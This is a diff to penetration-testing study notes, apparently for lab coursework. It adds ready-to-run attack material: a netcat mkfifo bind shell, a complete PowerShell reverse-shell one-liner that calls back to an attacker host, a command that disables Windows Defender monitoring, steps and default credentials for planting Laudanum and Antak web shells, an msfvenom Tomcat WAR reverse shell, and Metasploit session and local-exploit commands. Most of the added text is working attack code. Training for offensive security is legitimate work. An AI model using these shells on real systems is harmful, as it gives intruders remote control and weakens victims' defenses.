@@ -242,7 +242,121 @@ See [[Antivirus Evasion#Capstone 1: Shellter + PuTTY + COMODO + FTP|Capstone 1]]
 
 ---
 
-## **Outstanding**
-This area grows alongside the modules. Whenever a new shell delivery mechanism comes up (Windows named-pipe shells, etc), add it here with a link back to the source section.
+## Bind Shells
+
+When the target is behind a NAT or firewall blocking inbound connections to your listener, use a bind shell (the target listens, you connect to it).
+
+```bash
+# Linux mkfifo bind shell (target runs this, then you connect)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET_IP PORT > /tmp/f
+
+# Connect from Kali after the target runs the above
+nc -nv TARGET_IP PORT
+```
+
+🔁 [[Shells & Payloads (HTB Supplementary)#SP.2. mkfifo Bind Shell|SP.2]]
+
+#### Tags: #BindShell #mkfifo #netcat
+
+---
+
+## PowerShell TCPClient Reverse Shell
+
+One-liner for Windows targets (paste directly into a cmd or PS prompt, no file drop):
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('KALI_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Disable Windows Defender real-time monitoring first if needed (requires admin):
+# Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+Catch it with `nc -nvlp PORT` on Kali.
+
+🔁 [[Shells & Payloads (HTB Supplementary)#SP.3. PowerShell Reverse Shell + Disable Defender|SP.3]]
+
+#### Tags: #PowerShell #TCPClient #ReverseShell #Windows
+
+---
+
+## Web Shells — Laudanum (ASPX) and Antak
+
+```bash
+# Laudanum ASPX webshell (for IIS/ASP.NET targets)
+# 1. Copy to working dir
+cp /usr/share/laudanum/aspx/shell.aspx .
+# 2. Edit line 59: add Kali IP to the allowed-IP list (one IP per line in the array)
+# 3. Upload to target via the target's file manager, web upload vuln, FTP, etc.
+# 4. Navigate to: http://TARGET/files/shell.aspx
+# Note: IIS working dir is usually c:\windows\system32\inetsrv
+
+# Antak webshell (Nishang)
+cp /usr/share/nishang/Antak-WebShell/antak.aspx .
+# Default creds: Disclaimer / ForLegitUseOnly
+# Navigate to: http://TARGET/antak.aspx
+# Note: runs as iis apppool\<appname>, likely has SeImpersonatePrivilege
+```
+
+🔁 [[Shells & Payloads (HTB Supplementary)#SP.7. Laudanum ASPX Webshell|SP.7]], [[Shells & Payloads (HTB Supplementary)#SP.8. Antak Webshell|SP.8]]
+
+#### Tags: #Laudanum #Antak #Webshell #ASPX #IIS #Nishang
+
+---
+
+## Tomcat WAR Shell Delivery
+
+```bash
+# Generate a WAR reverse shell with msfvenom
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=PORT -f war -o shell.war
+
+# Upload via Tomcat Manager App (/manager/html) — requires valid Tomcat credentials
+# Deploy section → browse → select shell.war → deploy
+# Shell appears at: http://TARGET:8080/shell
+
+# Start listener before deploying
+nc -nvlp PORT
+```
+
+If the target is behind a pivot/jump host, set `LHOST` to the internal IP of the jump host (not your Kali IP) and catch the shell on the pivot.
+
+🔁 [[Shells & Payloads (HTB Supplementary)#SP.10. Tomcat WAR Shell Delivery|SP.10]]
+
+#### Tags: #Tomcat #WAR #msfvenom #JavaShell
+
+---
+
+## Metasploit Session Management
+
+```bash
+# Launch with DB for scan storage
+sudo msfdb run
+
+# Run Nmap from within msfconsole (results auto-stored)
+db_nmap -A --top-ports 60 -T5 TARGET_IP
+hosts          # query stored hosts
+services       # query stored services
+
+# Set option globally for all modules
+setg LHOST tun0    # persists when switching modules
+unsetg LHOST
+
+# Background an active session (keeps it alive)
+background     # or: Ctrl+Z
+
+# List and interact with sessions
+sessions           # show all
+sessions -i 1      # attach to session 1
+sessions -k 1      # kill session 1
+
+# Run a local exploit against an existing session
+use exploit/linux/local/sudo_baron_samedit
+set SESSION 1      # the existing session ID
+set LPORT 9001     # change from 4444 to avoid port conflict with original handler
+run
+```
+
+🔁 [[Using the Metasploit Framework (HTB Supplementary)#MSF.1. MSF Database Setup|MSF.1]], [[Using the Metasploit Framework (HTB Supplementary)#MSF.3. Session Management|MSF.3]]
+
+#### Tags: #Metasploit #msfdb #dbNmap #SessionManagement #setg #background
 
 *(`msfvenom` syntax for generating shellcode/payloads lives in [[Buffer Overflow & Memory Corruption#msfvenom: Generating Shellcode for a BOF Payload|Buffer Overflow & Memory Corruption]], where it was first taught in depth, since [[Fixing Exploits]] is where bad-char/encoder/format flags actually mattered.)*
